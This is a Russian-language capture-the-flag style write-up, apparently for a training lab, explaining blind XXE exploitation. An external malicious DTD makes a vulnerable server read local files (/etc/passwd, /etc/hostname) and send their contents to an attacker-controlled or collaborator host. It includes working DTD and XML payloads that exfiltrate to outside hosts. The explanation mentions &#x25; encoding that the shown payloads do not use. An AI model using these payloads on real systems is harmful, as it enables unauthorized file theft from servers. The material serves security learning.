## СХЕМА АТАКИ -как  работает

мне нужно сделать так, чтобы уязвимый сервер сам сходил на мой сайт, скачал там инструкцию (вредоносный DTD), и выполнил её.

1  Я создаю вредоносный DTD-файл и кладу его на свой сервер (или на эксплуатационный сервер в лабе)
   
2  Я отправляю уязвимому приложению XML с параметрической сущностью, которая указывает на мой внешний DTD , которая заставит вывполнить запрос на мой север 
   
3  приложение скачивает и выполняет мой DTD
   
4  пой DTD заставляет приложение прочитать локальный файл и отправить его содержимое на мой коллаборатор

## СОЗДАНИЕ ВРЕДОНОСНОГО DTD

Вот как выглядит классический вредоносный DTD для кражи файла `/etc/passwd`:
нужно оставить это на своем сервере, чтобы в ответе он отдал это при запросе!!! это сделать не сложно

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://мой+сервак.com/?x=%file;'>">
%eval;
%exfil;
```

>Че здесь происходит -

1 **`<!ENTITY % file SYSTEM "file:///etc/passwd">`** - объявляется параметрическая сущность `file` =  когда она будет использована, она прочитает содержимое файла `/etc/passwd`
   
2 **`<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://мой_сервак.com/?x=%file;'>">`** - Объявляется сущность `eval`. Самое хитрое. Её значение - это текст, который содержит объявление еще одной сущности `exfil`. Эта внутренняя сущность `exfil` пытается сделать запрос на мой сервер и в параметре `?x=` передать содержимое файла (значение сущности `%file`)
   
3 **`%eval;`** - Здесь я вызываю сущность `eval`. Это заставляет парсер динамически создать (объявить) новую сущность `exfil` прямо во время выполнения
   
4 **`%exfil;`** - Теперь я вызываю только что созданную сущность `exfil`. Это заставляет парсер сделать HTTP-запрос на `http://мой-сервак.com/?x=содерж_файла_etc_passwd`
   
 В итоге содержимое файла улетает на мой сервер в параметрах GET-запроса

Для лабы мне нужно прочитать файл `/etc/hostname`, поэтому я изменю путь в первой строке

## ПОЧЕМУ ИМЕННО  `&#x25;`

мнутри сущности `eval` я вижу странную запись `&#x25;`
Это HTML-код (или XML-код) для символа процента `%`

мне это нужно, потому что я объявляю новую параметрическую сущность `%exfil` внутри другой параметрической сущности `eval` 
Если бы я написал просто `%exfil`, парсер попытался бы сразу же вычислить `%exfil` внутри строки `eval`, но на тот момент этой сущности еще не существует.

Использование `&#x25;` позволяет мне "замаскировать" символ процента, чтобы он попал в итоговое объявление как есть. Когда `eval` срабатывает, `&#x25;`превращается обратно в `%`, и создается правильная сущность `%exfil;`

### Шаг 1: Получаю коллаборатор

мне нужен URL для приема данных. Использую Burp Collaborator (или [oast.fun](https://oast.fun/)). Копирую поддомен, например: `8x6h4a3t2c1p.oastify.com`

### Шаг 2: Создаю вредоносный DTD на своем сервере

создаю файл с именем, например, `evil.dtd`, и помещаю его на свой сервер (или на эксплуатационный сервер, который дают в лабе).
Содержимое файла `evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://8x6h4a3t2c1p.oastify.com/?x=%file;'>">
%eval;
%exfil;
```

мой DTD будет доступен по адресу,
например: `http://мой-сервер.com/evil.dtd`.

### Шаг 3: Отправляю пейлоад в уязвимое приложение

Перехватываю запрос на проверку стока и модифицирую XML. Мне нужно заставить сервер скачать и выполнить мой внешний DTD.


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://мой-сервер.com/evil.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Че здесь происходит:

1  Объявляется сущность `%xxe`, которая указывает на мой внешний DTD.
   
2  Тут же вызывается `%xxe;`. Сервер идет по ссылке, скачивает `evil.dtd`.
   
3  Сервер выполняет код из моего DTD, в результате чего содержимое `/etc/hostname` улетает на мой коллаборатор.
   

### Шаг 4: получаю данные из логов

В строке запроса `/?x=...` будет значение файла `/etc/hostname`, например `server-01`. Лаба решена.

## ВЫВОД
Я не просто заставляю сервер стучаться ко мне, а даю ему скрипт (внешний DTD), который он послушно выполняет:

1 Мой сервер хранит вредоносный DTD.
2 Уязвимый сервер качает и выполняет мой DTD.
3 Мой DTD приказывает прочитать файл и отправить данные на мой коллаборатор.


Это цепочка из двух запросов: от уязвимого сервера ко мне (за инструкцией) и от него же к моему коллаборатору (с данными).

## СУТЬ!

| Компонент                       | Роль                                                                                            |
| ------------------------------- | ----------------------------------------------------------------------------------------------- |
| Мой сервер (или exploit server) | Хранит вредоносный DTD-файл с инструкцией по краже                                              |
